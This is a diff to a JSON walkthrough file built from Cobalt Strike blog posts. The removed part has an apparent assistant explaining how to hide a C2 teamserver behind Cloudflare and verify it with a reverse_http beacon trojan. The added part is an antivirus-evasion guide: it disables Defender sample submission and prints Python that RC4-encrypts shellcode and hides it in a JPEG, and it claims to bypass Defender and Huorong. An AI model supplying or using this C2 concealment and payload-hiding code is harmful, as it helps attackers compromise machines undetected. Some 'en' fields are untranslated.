@@ -1,90 +1,78 @@
 {
-    "_source_md":  "CobaltStrike/2022-02-19-Cobalt-Stike-hidden-true-ip.md",
-    "version":  "cobalt-strike-hidden-ip",
-    "title":  {
-                  "zh":  "Cobalt Strike 服务器隐藏真实 IP：CDN 接入技术",
-                  "en":  "Cobalt Strike Server Hidden True IP: CDN Integration Technology"
-              },
-    "description":  {
-                        "zh":  "介绍如何通过 Cloudflare CDN 接入技术隐藏 Cobalt Strike C2 服务器的真实 IP 地址，包括 DNS 配置、SSL 设置、Listeners 配置等关键技术。",
-                        "en":  "Introduction to hiding Cobalt Strike C2 server real IP address through Cloudflare CDN integration technology, including DNS configuration, SSL settings, Listeners configuration and other key techniques."
-                    },
-    "steps":  [
-                  {
-                      "type":  "user_message",
-                      "content":  {
-                                      "zh":  "如何通过 CDN 隐藏 CS 服务器真实 IP？",
-                                      "en":  "How to hide CS server real IP through CDN?"
-                                  },
-                      "annotation":  {
-                                         "zh":  "用户询问 CS 服务器隐匿技术",
-                                         "en":  "User asks about CS server anonymity techniques"
-                                     },
-                      "codeBlocks":  [
-                                         {
-                                             "caption":  {
-                                                             "zh":  "",
-                                                             "en":  ""
-                                                         },
-                                             "code":  "beacon\u003e shell ipconfig",
-                                             "language":  "bash"
-                                         }
-                                     ]
-                  },
-                  {
-                      "type":  "assistant_text",
-                      "content":  {
-                                      "zh":  "CDN 隐藏 IP 流程：1) 登录 VPS 启动 teamserver；2) 修改域名 DNS 到 Cloudflare；3) 添加 DNS A 记录指向 VPS 真实 IP；4) 配置 Cloudflare SSL/TLS 设置：关闭自动 HTTPS 重写和始终使用 HTTPS；5) 关闭 Always Online 缓存功能。等待 DNS 生效后即可通过域名访问。",
-                                      "en":  "CDN hiding IP process: 1) Login to VPS and start teamserver; 2) Modify domain DNS to Cloudflare; 3) Add DNS A record pointing to VPS real IP; 4) Configure Cloudflare SSL/TLS settings: disable automatic HTTPS rewrite and Always Use HTTPS; 5) Disable Always Online caching. Wait for DNS to take effect then access via domain."
-                                  },
-                      "annotation":  {
-                                         "zh":  "助手响应",
-                                         "en":  "助手响应"
-                                     }
-                  },
-                  {
-                      "type":  "user_message",
-                      "content":  {
-                                      "zh":  "CS 客户端 Listeners 如何配置？",
-                                      "en":  "How to configure CS client Listeners?"
-                                  },
-                      "annotation":  {
-                                         "zh":  "用户执行操作",
-                                         "en":  "用户执行操作"
-                                     }
-                  },
-                  {
-                      "type":  "assistant_text",
-                      "content":  {
-                                      "zh":  "Listeners 配置要点：填写 Host 和 Port，Cloudflare HTTP 端口支持：80, 8080, 8880, 2052, 2082, 2086, 2095；HTTPS 端口支持：443, 2053, 2083, 2087, 2096, 8443。关键发现：使用 CDN 隐藏 IP 时，HTTP(s) Hosts 栏必须填写 CS 主机的真实 IP，而非域名。",
-                                      "en":  "Listeners configuration points: Fill in Host and Port, Cloudflare HTTP ports support: 80, 8080, 8880, 2052, 2082, 2086, 2095; HTTPS ports support: 443, 2053, 2083, 2087, 2096, 8443. Key finding: When using CDN to hide IP, HTTP(s) Hosts field must be filled with CS host\u0027s real IP, not domain name."
-                                  },
-                      "annotation":  {
-                                         "zh":  "助手响应",
-                                         "en":  "助手响应"
-                                     }
-                  },
-                  {
-                      "type":  "user_message",
-                      "content":  {
-                                      "zh":  "如何验证隐藏效果？",
-                                      "en":  "How to verify the hiding effect?"
-                                  },
-                      "annotation":  {
-                                         "zh":  "用户执行操作",
-                                         "en":  "用户执行操作"
-                                     }
-                  },
-                  {
-                      "type":  "assistant_text",
-                      "content":  {
-                                      "zh":  "验证方法：1) 生成 windows/beacon_http/reverse_http 木马；2) 在靶机执行 shell 命令如 ipconfig；3) 使用 Wireshark 监听流量，确认流量已发送到对应域名而非真实 IP；4) 等待命令返回包验证通信正常。CDN 接入成功后，流量特征显示域名访问。",
-                                      "en":  "Verification method: 1) Generate windows/beacon_http/reverse_http trojan; 2) Execute shell command like ipconfig on target machine; 3) Use Wireshark to monitor traffic, confirm traffic sent to corresponding domain instead of real IP; 4) Wait for command return packet to verify normal communication. After successful CDN integration, traffic features show domain access."
-                                  },
-                      "annotation":  {
-                                         "zh":  "助手响应",
-                                         "en":  "助手响应"
-                                     }
-                  }
-              ]
+  "_source_md": "CobaltStrike/2022-02-24-Cobalt-Stike-beacon-bypass-walkthrough.md",
+  "version": "Cobalt-Stike-beacon-bypass-walkthrough",
+  "title": {
+    "zh": "CS上线木马免杀入门",
+    "en": "CS上线木马免杀入门"
+  },
+  "description": {
+    "zh": "「Cobalt Strike」",
+    "en": "「Cobalt Strike」"
+  },
+  "steps": [
+    {
+      "type": "system_event",
+      "content": {
+        "zh": "Windows安全中心 -> 病毒和威胁防护 -> \"病毒和威胁防护\"设置 -> 管理设置 -> 自动提交样本【关】",
+        "en": "Windows安全中心 -> 病毒和威胁防护 -> \"病毒和威胁防护\"设置 -> 管理设置 -> 自动提交样本【关】"
+      },
+      "annotation": {
+        "zh": "章节：Windows Defender关闭自动提交样本",
+        "en": "Section: Windows Defender关闭自动提交样本"
+      }
+    },
+    {
+      "type": "system_event",
+      "content": {
+        "zh": "- [Golang Based on Windows](https://go.dev/doc/install)\n- [Python Based on Window/Linux/macOS](https://www.python.org/downloads/)\n  - pip/pip3\n- [CS-Loader](https://github.com/Gality369/CS-Loader.git)\n原仓库：",
+        "en": "- [Golang Based on Windows](https://go.dev/doc/install)\n- [Python Based on Window/Linux/macOS](https://www.python.org/downloads/)\n  - pip/pip3\n- [CS-Loader](https://github.com/Gality369/CS-Loader.git)\n原仓库："
+      },
+      "annotation": {
+        "zh": "章节：1、环境",
+        "en": "Section: 1、环境"
+      },
+      "codeBlocks": [
+        {
+          "language": "text",
+          "code": "origin\thttps://github.com/Gality369/CS-Loader.git (fetch)\norigin\thttps://github.com/Gality369/CS-Loader.git (push)"
+        }
+      ]
+    },
+    {
+      "type": "system_event",
+      "content": {
+        "zh": "详细过程可以参考[CS-Loader仓库教程](https://github.com/Gality369/CS-Loader/blob/master/README.md#%E4%BD%BF%E7%94%A8)\n不做搬运\n2x01 效果\ngolang版成功通过微软Defender/火绒免杀；\n- 火绒\n- 微软Defender",
+        "en": "详细过程可以参考[CS-Loader仓库教程](https://github.com/Gality369/CS-Loader/blob/master/README.md#%E4%BD%BF%E7%94%A8)\n不做搬运\n2x01 效果\ngolang版成功通过微软Defender/火绒免杀；\n- 火绒\n- 微软Defender"
+      },
+      "annotation": {
+        "zh": "章节：2、实现",
+        "en": "Section: 2、实现"
+      }
+    },
+    {
+      "type": "system_event",
+      "content": {
+        "zh": "3x00 梳理\n建议自己尝试一下过程，可以参考上面的README，或者我这里传了一份[梳理过后的代码](https://github.com/Bin4xin/bigger-than-bigger/blob/master/Bypass-antivirus/Cobalt-Stike/golang/CS-Loader.go)\n下面看一下图片shellcode的加密生成方式\n3x01 图片shellcode生成\n- rc4：\n- 加密效果：\n实际上，我们在做渗透的时候也可以发现这样类似的加密算法，代码我也放到了[Bigger仓库::generator.py](https://github.com/Bin4xin/bigger-than-bigger/blob/master/Bypass-antivirus/Cobalt-Stike/golang/generator.py)，\n当然具体问题具体分析，权当抛砖引玉；\n以上。",
+        "en": "3x00 梳理\n建议自己尝试一下过程，可以参考上面的README，或者我这里传了一份[梳理过后的代码](https://github.com/Bin4xin/bigger-than-bigger/blob/master/Bypass-antivirus/Cobalt-Stike/golang/CS-Loader.go)\n下面看一下图片shellcode的加密生成方式\n3x01 图片shellcode生成\n- rc4：\n- 加密效果：\n实际上，我们在做渗透的时候也可以发现这样类似的加密算法，代码我也放到了[Bigger仓库::generator.py](https://github.com/Bin4xin/bigger-than-bigger/blob/master/Bypass-antivirus/Cobalt-Stike/golang/generator.py)，\n当然具体问题具体分析，权当抛砖引玉；\n以上。"
+      },
+      "annotation": {
+        "zh": "章节：3、思路",
+        "en": "Section: 3、思路"
+      },
+      "codeBlocks": [
+        {
+          "language": "text",
+          "code": "#base64encode\nbaseStr = base64.b64encode(shellcode)\n#RC4 + base64encode\npayload = rc4(baseStr, key)\n\nwith open(imgName, 'rb') as f:\n    img = f.read()\n    fileend = img[-2:]\n    if(ord(fileend[0])!=255 and ord(fileend[0])!=217):\n        if(img.count(chr(255)+chr(217))>0):# 不以ffd9结尾，但是内容中包含有ffd9，说明图片有误 或者已经在ffd9后追加过内容了 \n            print(\"Please change the img.\")\n            exit(0)\n        else:\n            payload = img + chr(255)+chr(217) + payload\n            print(\"Abnormal end of file, auto add \\xff\\xd9\")\n    #以上判断图片的正确性以及进行图片矫正\n    else:\n        payload = img + payload\n        #插入的图片插入经过rc4加密的base64(shellcode)，往下看rc4\n    with open(\"shellcode_\"+imgName,'wb') as f1:\n        f1.write(payload)\nprint(\"Payload has write to shellcode_\"+imgName)"
+        },
+        {
+          "language": "text",
+          "code": "# rc4接收主方法传过来的 (b64encode(shellcode),rc4加密key)\ndef rc4(text, key):\n  key = hashlib.md5(key).hexdigest()\n  # Use md5(key) to get 32-bit key instead raw key\n  result = ''\n  key_len = len(key)\n  #1. init S-box\n  box = list(range(256))#put 0-255 into S-box\n  j = 0\n  for i in range(256):#shuffle elements in S-box according to key\n      j = (j + box[i] + ord(key[i%key_len]))%256\n      #取模\n      box[i],box[j] = box[j],box[i]#swap elements\n  i = j = 0\n  for element in text:\n      i = (i+1)%256\n      j = (j+box[i])%256\n      box[i],box[j] = box[j],box[i]\n      k = chr(ord(element) ^ box[(box[i]+box[j])%256])\n      result += k\n  # bla bla bla..    \n  result = base64.b64encode(result)\n  return result"
+        },
+        {
+          "language": "text",
+          "code": "$ python generator.py\nADdk943ZPviJWuFP5HO6HsUbbf3/UibLBKbjBQNvx314kU2L8vjUSpdIwV/cx20/2W0Skzghdf4oYRZfF1/0P+xhSgYqRXESzhXpqoLHXiVzDyezyOp9p03As6I3lXCP9w9r+CBG5VQIg3sCak05aAG1rRAoAD8L7FbzFQCbnhn+BgKe4A7J95vKyGzmFBuNiQoBqOEbNKNuF6oaXbsDTw6s9ymflG7yna8Os9zOOS4JSFZ5Ds4slcQ6pFHZK16OERLSN9x8hdjlLVKUKqTmPhl1Y3hepr2nF5G/NkS6esZTEsEJHRPcXpQineKVL/T5uxoliiLOeZdjlrGgnDGrgMC5N8O66DXyK3bGdYpVMrzj9iQzCwdXn0PdquAhAZynjtos1c6S4De9EVxbJaes6k/QeCjrkD234qPTt5c4C8zm/bhrZ0ghVAAl4LPwiPZsu5bYONMeYApBJ81IBec46RSFFN5LWzdhJEutJDx9w/AyYS1iphRShAczz6GmeVDaXeY83LhzKNKMlXNJfVv57DFDX4MiKiZq4SO5roUkUQ1mTYCG3LzdTFDhC7JQdwML2WBwubnPt8kCs6woxC0P2y5eAn77KivDovGsB3INBxqErgonfKWPgcCJVixYBfRP7FxfBYoAjw9xiiLuwDOxQaYAKGAfPI/9ctphRPWa8ZPzaJ7fpF4dO8UERVh0/IYlgeJx9hLVvEkjf9O0y1O688E1Giuo+D8pgdZo4WnsTWNBfU+woqo/34ZzxHV/3xKFlKljBD0+XoyKTLYmUju6pwv5TEfBbiMd+Hrs5Oh9s0fkKOyybuhrCEX8zrpMHcNhng996olYzcKNxCoZzDuFFvDwGkX3vXNN+GWTgKZc6lnp+hrX2Z0ZDaivLVyZU2NCS6YBq7BjEgntO2oYWlRiUXUKejHysunVUVE4LPtiO6nAJXTELd3SAXG8G4Sy5RjDK3c0GaAjvaeJ0//TpFecPPvMOJCukvvwoUTziex5cQ8Q+C6TwQKlO0zgHdXHALfkkSroBBGmqGZjqdCgaTTKHKOoAC9STz83g6jsI//Jpkjfwc3Avp75u1/4dswHjJk73Ncl9VMXxvMAVFqHzFM1+zuDQo74fw1DLwwXMLDoBuBgD5kf5emmhgDtFRDO5FofOlhQ4L06vNgGJw7s1D1b76YWmY6xv5Uk1IvTYqn8cb4bFzHrQgwuhPcBpITJ7Q7Wu7HZhlLkfKLor7kso4fn0gDUv258Q1MDelXWABmdlkzYSKOUOnsRUTi2hSI65Wy9GgL6IAyMx6vo/iwuKlYlkBafqPjFNY2O3LhVgTYrxmC8y7oXHnBR23wFNrNXlvtct/B8xIL8hiPA4rVcpK2ouPacFZYbdjS74JUdHwKMv5lAC3UpmoevzCQzcze0R03R5p6ZHgvjLxuqKFBkKSgHrAbivLnMEPDXzK3UeKSvG2ftsZiXPCPMZTjD0jBti4ubHc++RzHVC+Zq6ioj3nXjifF2FoJcnPGcdKkYHZBZlL6X5ptXxsT2FFtUTgZYD+iBnS4UlmTdK/oKNsds+ma8E1iBv4K04P83bSIgvunvA/xFX3N6u0m5qevZemY+RTsynSjPrg==\n#看起来像base64，实际上无法反编码\n\n$ python generator.py |base64 -d\n7d��>�Z�O�s����R&���o�}x�M����J�H�_��m?�m�8!u�(a__�?�aJ*Eq�骂�^%s'���}�M���7�p��k� F��{jM9h��(?\n..."
+        }
+      ]
+    }
+  ]
 }
